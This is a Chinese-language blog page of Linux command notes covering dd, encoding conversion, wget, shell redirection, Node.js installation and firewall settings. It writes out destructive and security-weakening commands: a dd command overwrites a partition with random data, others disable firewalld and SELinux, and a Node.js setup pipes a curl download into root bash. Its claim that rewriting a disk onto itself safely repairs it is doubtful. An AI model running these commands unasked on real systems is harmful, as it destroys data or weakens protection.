<h3 id="dd命令解释"><a href="#dd命令解释" class="headerlink" title="dd命令解释"></a>dd命令解释</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt;if=inputfile&gt;</span><br><span class="line">2.of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;</span><br><span class="line">3.ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。</span><br><span class="line">obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节。</span><br><span class="line">4.cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。</span><br><span class="line">5.skip=blocks：从输入文件开头跳过blocks个块后再开始复制。</span><br><span class="line">6.seek=blocks：从输出文件开头跳过blocks个块后再开始复制。</span><br><span class="line">注意：通常只用当输出文件是磁盘或磁带时才有效，即备份到磁盘或磁带时才有效。</span><br><span class="line">7.count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。</span><br><span class="line">8.conv=conversion：用指定的参数转换文件。</span><br><span class="line">ascii：转换ebcdic为ascii</span><br><span class="line">ebcdic：转换ascii为ebcdic</span><br><span class="line">ibm：转换ascii为alternateebcdic</span><br><span class="line">block：把每一行转换为长度为cbs，不足部分用空格填充</span><br><span class="line">unblock：使每一行的长度都为cbs，不足部分用空格填充</span><br><span class="line">lcase：把大写字符转换为小写字符</span><br><span class="line">ucase：把小写字符转换为大写字符</span><br><span class="line">swab：交换输入的每对字节</span><br><span class="line">noerror：出错时不停止</span><br><span class="line">notrunc：不截短输出文件</span><br><span class="line">sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</span><br></pre></td></tr></table></figure>
<p>1.将本地的/dev/hdb整盘备份到/dev/hdd<br><code>dd if=/dev/hdb of=/dev/hdd</code><br>2.将/dev/hdb全盘数据备份到指定路径的image文件<br><code>dd if=/dev/hdb of=/root/image</code><br>3.将备份文件恢复到指定盘<br><code>dd if=/root/image of=/dev/hdb</code><br>4.备份/dev/hdb全盘数据，并利用gzip工具进行压缩，保存到指定路径<br><code>dd if=/dev/hdb | gzip &gt; /root/image.gz</code><br>5.将压缩的备份文件恢复到指定盘<br><code>gzip -dc /root/image.gz | dd of=/dev/hdb</code><br>6.备份磁盘开始的512个字节大小的MBR信息到指定文件<br><code>dd if=/dev/hda of=/root/image count=1 bs=512</code><br>count=1指仅拷贝一个块；bs=512指块大小为512个字节。<br>恢复：<br><code>dd if=/root/image of=/dev/hda</code><br>7.备份软盘<br><code>dd if=/dev/fd0 of=disk.img count=1 bs=1440k</code><br>(即块大小为1.44M)<br>8.拷贝内存内容到硬盘<br><code>dd if=/dev/mem of=/root/mem.bin bs=1024</code><br>(指定块大小为1k)<br>9.拷贝光盘内容到指定文件夹，并保存为cd.iso文件<br><code>dd if=/dev/cdrom(hdc) of=/root/cd.iso</code><br>10.增加swap分区文件大小<br>第一步：创建一个大小为256M的文件：<br><code>dd if=/dev/zero of=/swapfile bs=1024 count=262144</code><br>第二步：把这个文件变成swap文件：<br><code>mkswap /swapfile</code><br>第三步：启用这个swap文件：<br><code>swapon /swapfile</code><br>第四步：编辑/etc/fstab文件，使在每次开机时自动加载swap文件：<br><code>/swapfile swap swap defaults 0 0</code><br>11.销毁磁盘数据<br><code>dd if=/dev/urandom of=/dev/hda1</code><br>注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。<br>12.测试硬盘的读写速度<br><code>dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file</code><br><code>dd if=/root/1Gb.file bs=64k | dd of=/dev/null</code><br>通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。<br>13.确定硬盘的最佳块大小：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file</span><br><span class="line">dd if=/dev/zero bs=2048 count=500000 of=/root/1Gb.file</span><br><span class="line">dd if=/dev/zero bs=4096 count=250000 of=/root/1Gb.file</span><br><span class="line">dd if=/dev/zero bs=8192 count=125000 of=/root/1Gb.file</span><br></pre></td></tr></table></figure></p>
<p>通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。<br>14.修复硬盘<br><code>dd if=/dev/sda of=/dev/sda</code><br>当硬盘较长时间（比如1，2年）放置不使用后，磁盘上会产生magnetic fluxpoint。当磁头读到这些区域时会遇到困难，并可能导致I/O错误。当这种情况影响到硬盘的第一个扇区时，可能导致硬盘报废。上边的命令有可能使这些数据起死回生。且这个过程是安全，高效的。<br>15.dd命令做usb启动盘<br><code>dd if=xxx.iso of=/dev/sdb bs=1M</code><br>root用户或者sudo，用以上命令前必须卸载u盘,sdb是你的u盘,bs=1M是块的大小,后面的数值大,写的速度相对快一点,但也不是无限的,我一般选2M,注意,执行命令后很快完成,但u盘还在闪,等不闪了,安全移除。</p>
<h2 id="Linux系统-cmake2-8升级到cmake-3-9-2版本"><a href="#Linux系统-cmake2-8升级到cmake-3-9-2版本" class="headerlink" title="Linux系统 cmake2.8升级到cmake-3.9.2版本"></a>Linux系统 cmake2.8升级到cmake-3.9.2版本</h2><p>1、查看当前版本</p>
<p><code>cmake --version</code></p>
<p>2、下载获得cmake-3.9.2源码 </p>
<p><code>wget https://cmake.org/files/v3.9/cmake-3.9.2.tar.gz</code></p>
<p>3、解压、安装新版本</p>
<p><code>tar -xvf cmake-3.9.2.tar.gz</code></p>
<p><code>cd cmake-3.9.2</code></p>
<p><code>./configure</code></p>
<p><code>sudo make &amp;&amp; make install</code></p>
<p>【注】安装完后，执行cmake –version会报如下错误<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CMake Error: Could not find CMAKE_ROOT !!!</span><br><span class="line">CMake has most likely not been installed correctly.</span><br><span class="line">Modules directory not found in</span><br><span class="line">/Applications/CMake 2.8-11.app/Contents/bin</span><br><span class="line">CMake Error: Error executing cmake::LoadCache(). Aborting.</span><br></pre></td></tr></table></figure></p>
<p>【解决方法】</p>
<p>先执行：<code>hash -r</code></p>
<p>然后再执行：<code>cmake --version</code></p>
<p>完美解决</p>
<h2 id="Linux下文件编码批量转换UTF-8命令"><a href="#Linux下文件编码批量转换UTF-8命令" class="headerlink" title="Linux下文件编码批量转换UTF-8命令"></a>Linux下文件编码批量转换UTF-8命令</h2><h3 id="Linux命令-enca-查看文件的编码-好用-首推"><a href="#Linux命令-enca-查看文件的编码-好用-首推" class="headerlink" title="Linux命令 enca 查看文件的编码(好用 首推)"></a>Linux命令 enca 查看文件的编码(好用 首推)</h3><p>一、源码包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://dl.cihar.com/enca/</span><br></pre></td></tr></table></figure>
<p>二、使用方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enca -L zh_CN file 检查文件的编码 </span><br><span class="line">enca -L zh_CN -x UTF-8 file 将文件编码转换为&quot;UTF-8&quot;编码 </span><br><span class="line">enca -L zh_CN -x utf-8 *  把文件夹下的所有文件转换为utf8编码</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">三、批量转换</span><br><span class="line"></span><br><span class="line">目录转换报错不影响</span><br></pre></td></tr></table></figure>
<p>find | grep -v ‘.svn’ | xargs enca -L zh_CN -x UTF-8<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### 字符编码转换 iconv命令</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line"></span><br><span class="line">`iconv -f encoding [-t encoding] [inputfile]... `</span><br></pre></td></tr></table></figure></p>
<p>选项<br>-f encoding :把字符从encoding编码开始转换。<br>-t encoding :把字符转换到encoding编码。<br>-l :列出已知的编码字符集合<br>-o file :指定输出文件<br>-c :忽略输出的非法字符<br>-s :禁止警告信息，但不是错误信息<br>–verbose :显示进度信息<br>-f和-t所能指定的合法字符在-l选项的命令里面都列出来了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实例</span><br><span class="line">列出当前支持的字符编码： </span><br><span class="line"></span><br><span class="line">`iconv -l `</span><br><span class="line">将文件file1转码，转后文件输出到fil2中：</span><br><span class="line"></span><br><span class="line">`iconv file1 -f EUC-JP-MS -t UTF-8 -o file2`</span><br><span class="line"></span><br><span class="line">这里，没-o那么会输出到标准输出。</span><br><span class="line"></span><br><span class="line">### 在Linux下将整个目录的文件转换字符编码的脚本</span><br></pre></td></tr></table></figure></p>
<p>‘#’ !/bin/sh<br>for srcfile in *.gbk;<br>do<br>    dstfile=${srcfile/.gbk/}<br>    if [ “$srcfile” -nt “$dstfile” ]; then<br>            echo convert $srcfile to $dstfile …<br>            iconv -f gbk -t utf8 $srcfile &gt;$dstfile<br>    fi<br>done<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### linux文件名编码转换工具convmv(文件名而已)</span><br><span class="line"></span><br><span class="line">convmv能帮助我们很容易地对一个文件，一个目录下所有文件进行编码转换，比如gbk转为utf8等。</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">`convmv [options] FILE(S) … DIRECTORY(S)`</span><br></pre></td></tr></table></figure></p>
<p>主要选项：<br>1、-f ENCODING<br>指定目前文件名的编码，如-f gbk<br>2、-t ENCODING<br>指定将要转换成的编码，如-t utf-8<br>3、-r<br>递归转换目录下所有文件名<br>4、–list<br>列出所有支持的编码<br>5、–notest<br>默认是只打印转换后的效果，加这个选项才真正执行转换操作。<br>更多选项请man convmv。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例子：</span><br><span class="line">递归转换centos目录下的目前文件名编码gbk为utf-8:</span><br></pre></td></tr></table></figure></p>
<p>convmv -f gbk -t utf-8 –notest -r  centos<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## pkg-config 详解</span><br><span class="line"></span><br><span class="line">pkg-config是一个linux下的命令，用于获得某一个库/模块的所有编译相关的信息。 </span><br><span class="line"></span><br><span class="line">[pkg-config 详解(CSDN)](https://blog.csdn.net/newchenxf/article/details/51750239)</span><br><span class="line"></span><br><span class="line">## 使用 sudo apt-get install 命令安装软件的目录在哪？</span><br><span class="line"></span><br><span class="line">bin文件路径： /usr/bin </span><br><span class="line">库文件路径： /usr/lib/  </span><br><span class="line">其它的图标啊什么的路径： /usr/share </span><br><span class="line">配置文件路径： /etc/</span><br><span class="line"></span><br><span class="line">## Wget 命令详解</span><br><span class="line">[原文档](https://www.gnu.org/software/wget/manual/wget.html)</span><br><span class="line">```Wget主要用于下载文件，在安装软件时会经常用到，以下对wget做简单说明。</span><br><span class="line"></span><br><span class="line">1、下载单个文件：wget http://www.baidu.com。命令会直接在当前目录下载一个index.html的文件</span><br><span class="line"></span><br><span class="line">2、将下载的文件存放到指定的文件夹下，同时重命名下载的文件，利用-O：wget -O /home/index http://www.baidu.com</span><br><span class="line"></span><br><span class="line">3、下载多个文件：首先，创建一个file.txt文件，写入两个url（换行），如http://</span><br><span class="line">www.baidu.com;然后，wget -i file.txt;命令执行后会下载两个两个文件。</span><br><span class="line"></span><br><span class="line">4、下载时，不显示详细信息，即在后台下载：wget -b http://www.baidu.com。命令执行后</span><br><span class="line">会，下载的详细信息不会显示在终端，会在当前目录下生成一个web-log记录下载的详细信息。</span><br><span class="line"></span><br><span class="line">5、下载时，不显示详细信息，同时将下载信息保存到执行的文件中（同4）：wget -o dw.txt http://www.baidu.com</span><br><span class="line"></span><br><span class="line">6、断点续传：wget -c http://www.baidu.com</span><br><span class="line"></span><br><span class="line">7、限制下载的的速度：wget --limit-rate=100k -O zfj.html http://www.baidu.com</span><br><span class="line"></span><br><span class="line">8、测试是否能正常访问：wget --spider http://www.baidu.com</span><br><span class="line"></span><br><span class="line">9、设置下载重试的次数：wget --tries=3 http://www.baidu.com</span><br><span class="line"></span><br><span class="line">10、下载一个完整的网站，即当前页面所依赖的所有文件：wget --mirror -p </span><br><span class="line">--convert-links -P./test http://localhost</span><br><span class="line"></span><br><span class="line">　　--mirror:打开镜像选项</span><br><span class="line"></span><br><span class="line">　　-p:下载所有用于显示给定网址所必须的文件</span><br><span class="line"></span><br><span class="line">　　--convert-links：下载以后，转换链接用于本地显示</span><br><span class="line"></span><br><span class="line">　　-P LOCAL_DIR：保存所有的文件或目录到指定的目录下</span><br><span class="line"></span><br><span class="line">11、下载的过程中拒绝下载指定类型的文件:wget --reject=png --mirror -p</span><br><span class="line"> --convert-links -P./test http://localhost</span><br><span class="line"></span><br><span class="line">12、多文件下载中拒绝下载超过设置大小的文件：wget -Q5m -i file.txt</span><br><span class="line"></span><br><span class="line">　　注意：此选项只能在下载多个文件时有用，当你下载一个文件时没用。</span><br><span class="line"></span><br><span class="line">13、从指定网站中下载所有指定类型的文件：wget -r -A .png http://www.baidu.com</span><br><span class="line"></span><br><span class="line">14、wget下载时，某些资源必须使用--no-check-certificate http://www.baidu.com</span><br><span class="line"></span><br><span class="line">15、使用wget实现FTP下载：wget --file-user=USERNAME --file-password=PASSWORD url</span><br><span class="line"></span><br><span class="line">16、伪装代理名称下载 </span><br><span class="line">有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过–user-agent参数伪装。 </span><br><span class="line">wget –user-agent=”Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) </span><br><span class="line">AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16″ 下载链接</span><br></pre></td></tr></table></figure></p>
<h2 id="linux向文件末尾追加内容"><a href="#linux向文件末尾追加内容" class="headerlink" title="linux向文件末尾追加内容"></a>linux向文件末尾追加内容</h2><p>Shell 的 echo 指令与 PHP 的 echo 指令类似，都是用于字符串的输出。</p>
<p>比如<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;It is a test&quot;</span><br><span class="line">It is a test</span><br></pre></td></tr></table></figure></p>
<p>它也可以通过与&gt;符号配合将内容写入文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在尾部插入： </span><br><span class="line">echo &quot;abcdefg&quot; &gt;&gt; filename</span><br><span class="line"></span><br><span class="line">echo &apos;add content&apos;&gt;&gt;/home/data/test.sh</span><br><span class="line">&gt;&gt; 是追加 是在文件后追加内容</span><br><span class="line">echo &apos;add content&apos;&gt;/home/data/test.sh</span><br><span class="line">&gt; 是删除原有内容后，并写入自己当前的内容</span><br></pre></td></tr></table></figure></p>
<p>也可以通过-e符号来插入转义字符，比如<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo -e &quot;hello\nworld&quot; &gt;&gt; temp.txt</span><br><span class="line">cat temp.txt</span><br></pre></td></tr></table></figure></p>
<p>输出<br>hello<br>world</p>
<h2 id="amp-gt-dev-null表示的意思"><a href="#amp-gt-dev-null表示的意思" class="headerlink" title="&amp;&gt;/dev/null表示的意思"></a>&amp;&gt;/dev/null表示的意思</h2><p>这是把 stdout 送到 /dev/null 里面<br>那什麼是 /dev/null 呢，/dev/null 是 Unix/Linux 里的【无底洞】<br>任何的 output 送去了【无底洞】就再也没了。</p>
<p>command &gt; file 2&gt;file 的意思是将命令所产生的标准输出信息,和错误的输出信息送到file中，command  &gt; file 2&gt;file 这样的写法,stdout和stderr都直接送到file中, file会被打开两次,这样stdout和stderr会互相覆盖,这样写相当使用了FD1和FD2两个同时去抢占file 的管道.</p>
<p>而command &gt;file 2&gt;&amp;1 这条命令就将stdout直接送向file, stderr 继承了FD1管道后,再被送往file,此时,file 只被打开了一次,也只使用了一个管道FD1,它包括了stdout和stderr的内容.</p>
<p>从IO效率上,前一条命令的效率要比后面一条的命令效率要低,所以在编写shell脚本的时候,较多的时候我们会用command &gt; file 2&gt;&amp;1 这样的写法.<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。</span><br><span class="line"></span><br><span class="line">2&gt;&amp;1 ：接着，标准错误输出重定向 到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。</span><br></pre></td></tr></table></figure></p>
<h2 id="gt-dev-null-2-gt-amp-1-详解"><a href="#gt-dev-null-2-gt-amp-1-详解" class="headerlink" title="&gt;/dev/null 2&gt;&amp;1 详解"></a>&gt;/dev/null 2&gt;&amp;1 详解</h2><p>命令的结果可以通过%&gt;的形式来定义输出</p>
<p>分解这个组合：“&gt;/dev/null 2&gt;&amp;1” 为五部分。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1：&gt; 代表重定向到哪里，例如：echo &quot;123&quot; &gt; /home/123.txt</span><br><span class="line">2：/dev/null 代表空设备文件</span><br><span class="line">3：2&gt; 表示stderr标准错误</span><br><span class="line">4：&amp; 表示 等同于 的意思，2&gt;&amp;1，表示2的输出重定向 等同于 1</span><br><span class="line">5：1 表示stdout标准输出，系统默认值是1，所以&quot;&gt;/dev/null&quot;等同于 &quot;1&gt;/dev/null&quot;</span><br></pre></td></tr></table></figure></p>
<p>因此，&gt;/dev/null 2&gt;&amp;1也可以写成“1&gt; /dev/null 2&gt; &amp;1”</p>
<h2 id="windows编写sh脚本在linux上不能执行"><a href="#windows编写sh脚本在linux上不能执行" class="headerlink" title="windows编写sh脚本在linux上不能执行"></a>windows编写sh脚本在linux上不能执行</h2><p>编码没有被识别，<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi *.sh</span><br><span class="line"></span><br><span class="line">查看文件格式(显示  fileformat=dos)</span><br><span class="line">Esc 输入 :set fileformat</span><br><span class="line"></span><br><span class="line">修改文件格式(修改后 显示 fileformat=unix)</span><br><span class="line">Esc输入 :set fileformat=unix</span><br><span class="line"></span><br><span class="line">保存</span><br><span class="line">Esc输入 :wq</span><br></pre></td></tr></table></figure></p>
<h2 id="“源代码包”和“二进制包”的区别"><a href="#“源代码包”和“二进制包”的区别" class="headerlink" title="“源代码包”和“二进制包”的区别"></a>“源代码包”和“二进制包”的区别</h2><p>RPM 有分兩種：binary rpm 跟 source rpm 。<br>前者是編好的 binary ，安裝就可用。<br>後者是還沒編好的 source ，需 rebuild 之後才能安裝。</p>
<p>rpm格式很好区分，二进制格式的包名字很长，都带有版本号、适应平台、适应的硬件类型等，而源码格式仅仅就是一个版本号的tar包。<br>mysql-5.0.45.tar.gz                        是源码包<br>mysql-5.0.45-linux-x86_64-glibc23.tar.gz   是二进制包</p>
<p>源代码包里的文件往往会含有种种源代码文件，头文件<em>.h、c代码源文件</em>.c、C++代码源文件<em>.cc/</em>.cpp等；而二进制包里的文件则会有可执行文件（与软件同名的往往是主执行文件），标志是其所在路径含有名为bin的目录（仅有少数例外）</p>
<h2 id="查看linux中所有用户的三种方式"><a href="#查看linux中所有用户的三种方式" class="headerlink" title="查看linux中所有用户的三种方式"></a>查看linux中所有用户的三种方式</h2><p>通过使用/etc/passwd 文件，getent命令，compgen命令这三种方法查看系统中用户的信息。</p>
<p><a href="https://www.cnblogs.com/jackyyou/p/5498083.html" target="_blank" rel="noopener">linux下查看所有用户及所有用户组</a></p>
<h2 id="CentOS出现ifconfig-command-not-found解决途径"><a href="#CentOS出现ifconfig-command-not-found解决途径" class="headerlink" title="CentOS出现ifconfig: command not found解决途径"></a>CentOS出现ifconfig: command not found解决途径</h2><p>出现此问题的原因绝大多数情况下可能都是系统没有附带ipconfig，例如你安装的是CentOS最小安装包模式。</p>
<p>因此这个时候只需要我们使用命令安装ipconfig即可，命令如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install upgrade</span><br><span class="line">yum install net-tools</span><br></pre></td></tr></table></figure></p>
<p>如果本身已经安装了ipconfig但依然报错那就需要看看环境变量的设置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#echo $PATH</span><br></pre></td></tr></table></figure></p>
<p>如果环境变量中没有包含ipconfig命令的路径则需要临时修改环境变量：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$export PATH = $PATH:/sbin</span><br></pre></td></tr></table></figure></p>
<p>修改完成后测试ipconfig是否可以正常使用，如果可以正常使用则需要永久修改：打开/etc/profile</p>
<p>然后在该文件中填写export PATH=$PATH:/sbin并保存，保存后重启系统即可直接使用ipconfig命令了。</p>
<h2 id="替换指定的目录及其子目录下所有文件中的某些内容-n-种方法"><a href="#替换指定的目录及其子目录下所有文件中的某些内容-n-种方法" class="headerlink" title="替换指定的目录及其子目录下所有文件中的某些内容 ( n 种方法 )"></a>替换指定的目录及其子目录下所有文件中的某些内容 ( n 种方法 )</h2><h3 id="1-find-xargs"><a href="#1-find-xargs" class="headerlink" title="1.find | xargs"></a>1.find | xargs</h3><p><code>find -type f -name “*.sh” | xargs sed ‘s#oldboy#oldgril#g’ -i</code></p>
<h3 id="2-或“"><a href="#2-或“" class="headerlink" title="2. $()或“"></a>2. $()或“</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed &apos;s#oldboy#oldgril#g&apos; `find -type f -name &quot;*.sh&quot;`</span><br><span class="line">sed &apos;s#oldboy#oldgril#g&apos; $(find -type f -name &quot;*.sh&quot;)</span><br></pre></td></tr></table></figure>
<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3.-exec"></a>3.-exec</h3><p><code>find -type f -name “*.sh” -exec sed ‘s#oldboy#oldgirl#g’ {} \;</code></p>
<h3 id="4-grep"><a href="#4-grep" class="headerlink" title="4.grep"></a>4.grep</h3><p><code>sed -i “s/zhangsan/lisi/g” grep zhangsan -rl /modules</code></p>
<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p><code>alias 自定义命令名=‘命令’</code></p>
<h2 id="ack"><a href="#ack" class="headerlink" title="ack"></a>ack</h2><p><a href="https://beyondgrep.com/documentation/" target="_blank" rel="noopener">ack 使用手册</a></p>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><p>-r 表示搜索子目录<br>-l 表示输出匹配的文件名</p>
<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><p>sed 分为 命令、元字符集、替换标记</p>
<p>-i 表示inplace edit，就地修改文件</p>
<p>定界符可以任意</p>
<h2 id="Ubuntu-安装-Node"><a href="#Ubuntu-安装-Node" class="headerlink" title="Ubuntu 安装 Node"></a>Ubuntu 安装 Node</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">方法一：源码安装法：</span><br><span class="line"></span><br><span class="line">// 回主目录</span><br><span class="line">cd</span><br><span class="line">// 官网下载一个符合自己项目的 Node 最新版本</span><br><span class="line">wget https://nodejs.org/dist/latest-v8.x/node-v8.14.1-linux-x64.tar.gz</span><br><span class="line">// 解压</span><br><span class="line">tar xvzf node-v8.14.1-linux-x64.tar.gz</span><br><span class="line">// 更名</span><br><span class="line">mv node-v8.14.1-linux-x64 node8</span><br><span class="line">// 编辑 </span><br><span class="line">sudo vim /etc/profile</span><br><span class="line">// 内容</span><br><span class="line">export NODE_HOME=/home/ubuntu/node8</span><br><span class="line">PATH=$NODE_HOME/bin:$PATH</span><br><span class="line">// 立即生效</span><br><span class="line">source /etc/profile</span><br><span class="line">// 查看版本</span><br><span class="line"></span><br><span class="line">让npm和node命令全局生效</span><br><span class="line"></span><br><span class="line">　　方式一：环境变量方式（这种方式似乎只对登录用户有效？）</span><br><span class="line"></span><br><span class="line">　　1）、加入环境变量，在 /etc/profile 文件末尾增加配置</span><br><span class="line"></span><br><span class="line">        vi /ect/profile</span><br><span class="line">        export PATH=$PATH:/usr/local/nodejs/bin</span><br><span class="line">　　2）、执行命令使配置文件生效</span><br><span class="line"></span><br><span class="line">        source /etc/profile</span><br><span class="line">　　方式二：软链接方式（推荐）</span><br><span class="line"></span><br><span class="line">        ln -s /usr/local/nodejs/bin/npm /usr/local/bin/</span><br><span class="line">        ln -s /usr/local/nodejs/bin/node /usr/local/bin/</span><br><span class="line"></span><br><span class="line">查看nodejs是否安装成功</span><br><span class="line"></span><br><span class="line">    node -v</span><br><span class="line">    npm -v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装方法二 rpm法：</span><br><span class="line">第一步，去 nodejs 官网 https://nodejs.org 看最新的版本号；</span><br><span class="line"></span><br><span class="line">第二步，添加源后安装</span><br><span class="line">重点来了，nodejs 的每个大版本号都有相对应的源，比如这里的 10.x.x版本的源是https://deb.nodesource.com/setup_10.x。</span><br><span class="line"></span><br><span class="line">所以在终端执行：</span><br><span class="line"></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class="line"></span><br><span class="line">稍等片刻，源已经添加完毕，再执行：</span><br><span class="line"></span><br><span class="line">sudo apt-get install -y nodejs</span><br><span class="line"></span><br><span class="line">等待安装完成。</span><br><span class="line"></span><br><span class="line">顺带一提，如果你要安装12.x.x 的版本，只需要修改添加源地址中的数字即可，比如：</span><br><span class="line"></span><br><span class="line">curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -</span><br><span class="line"></span><br><span class="line">最后验证一下，执行：nodejs -v 即可出现刚才安装的版本号。</span><br></pre></td></tr></table></figure>
<h2 id="CentOS7查看和关闭防火墙"><a href="#CentOS7查看和关闭防火墙" class="headerlink" title="CentOS7查看和关闭防火墙"></a>CentOS7查看和关闭防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CentOS 7.0默认使用的是firewall作为防火墙</span><br><span class="line">查看防火墙状态</span><br><span class="line">firewall-cmd --state</span><br><span class="line"></span><br><span class="line">停止firewall</span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line"></span><br><span class="line">禁止firewall开机启动</span><br><span class="line">systemctl disable firewalld.service </span><br><span class="line"></span><br><span class="line">关闭selinux</span><br><span class="line">进入到/etc/selinux/config文件</span><br><span class="line">vi /etc/selinux/config</span><br><span class="line">将SELINUX=enforcing改为SELINUX=disabled</span><br></pre></td></tr></table></figure>
<h2 id="linux下安装使用dig命令"><a href="#linux下安装使用dig命令" class="headerlink" title="linux下安装使用dig命令"></a>linux下安装使用dig命令</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200301/oRO1B2v7F9Yb.png?imageslim" alt="mark"></p>
<p><a href="https://www.cmsky.com/linux-dig/" target="_blank" rel="noopener">参考链接</a></p>
<h2 id="Mercurial"><a href="#Mercurial" class="headerlink" title="Mercurial"></a>Mercurial</h2><p>版本控制系统<br>集中式版本控制系统：Subversion(SVN)、CVS、VSS 等。</p>
<p>分布式版本控制系统：Git、Mercurial(Hg) 等。</p>
<p>目前，应用较广泛的版本控制系统有 Git 和 SVN，二者分别代表着分布式和集中式版本控制系统的鲜明特点，这两类系统组织形式会在今后很长一段时间内共存。</p>
<p>相比之下，Mercurial 略显小众。这款由 Python 编写的分布式版本控制系统，具备出色的跨平台能力（基于 Python）和平滑的学习曲线，一度被视为 Git 的有力竞争者。随着 Git 的日益完善，包括 TortoiseGit 等开源项目的出现加强了 Git 在 Windows 平台上的支持，以及 GitHub 的出现简化了 Git 开发模型进而降低了学习难度，Mercurial 已渐渐被人遗忘。</p>
<p>由于 OpenJDK 托管在 Mercurial 平台上，稍微接触了一下 Mercurial。个人认为，目前与 Mercurial 打交道的场合可能仅限于远程仓库的克隆和更新，掌握一些基本操作足矣。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install mercurial  # 通过 pip 安装 Mercurial</span><br><span class="line"></span><br><span class="line">hg --version  # 查看 Mercurial 版本</span><br><span class="line"></span><br><span class="line">hg clone http://hg.openjdk.java.net/jdk8/jdk8 openjdk8  # 克隆远程仓库</span><br><span class="line"></span><br><span class="line">hg log  # 查看仓库历史</span><br><span class="line"></span><br><span class="line">hg pull  # 拉取代码</span><br><span class="line"></span><br><span class="line">hg status  # 查看仓库状态</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">https://www.mercurial-scm.org/downloads</span><br><span class="line"></span><br><span class="line">下载对应安装包/二进制包</span><br></pre></td></tr></table></figure>
<h2 id="CVS，GIT，Mercurial和SVN比较"><a href="#CVS，GIT，Mercurial和SVN比较" class="headerlink" title="CVS，GIT，Mercurial和SVN比较"></a>CVS，GIT，Mercurial和SVN比较</h2><p><img data-src="http://tuchuang.xchcloud.cn/blog/20200301/l97uUqNXMIqN.png?imageslim" alt="mark"></p>
<p><a href="https://www.cnblogs.com/likebeta/archive/2012/12/18/2822805.html" target="_blank" rel="noopener">参考链接</a></p>
<h2 id="超简单的Linux下运行jar包的方法"><a href="#超简单的Linux下运行jar包的方法" class="headerlink" title="超简单的Linux下运行jar包的方法"></a>超简单的Linux下运行jar包的方法</h2><p>优化方法一：<br><code>java -jar xxx.jar &amp;</code><br>&amp; 表示后台运行，ssh窗口不被锁定，但是关闭窗口时，程序还是会退出</p>
<p>优化方法二：<br><code>nohup java -jar xxx.jar &amp;</code><br>nohup 表示不挂断运行命令行，当账号退出或关闭终端时，程序仍然运行</p>
<p>当用 nohup 命令执行作业时，该作业的所有输出被重定向到nohup.out的文件中，除非另外指定了输出文件。</p>
<p>优化方法三：<br><code>nohup java -jar xxx.jar &gt;/usr/local/temp.txt &amp;</code></p>
<blockquote>
<p>/usr/local/temp.txt 表示将所有启动的日志信息记录到temp.txt文件中</p>
</blockquote>
<h2 id="Linux-screen"><a href="#Linux-screen" class="headerlink" title="Linux screen"></a>Linux screen</h2><p>介绍<br>screen 或 GNU screen 是终端多路复用器。换句话说，这意味着您可以启动 screen 会话，然后在该会话中打开任意数量的窗口（虚拟终端）。即使断开连接，当其窗口不可见时，在 screen 上运行的进程将继续运行。</p>
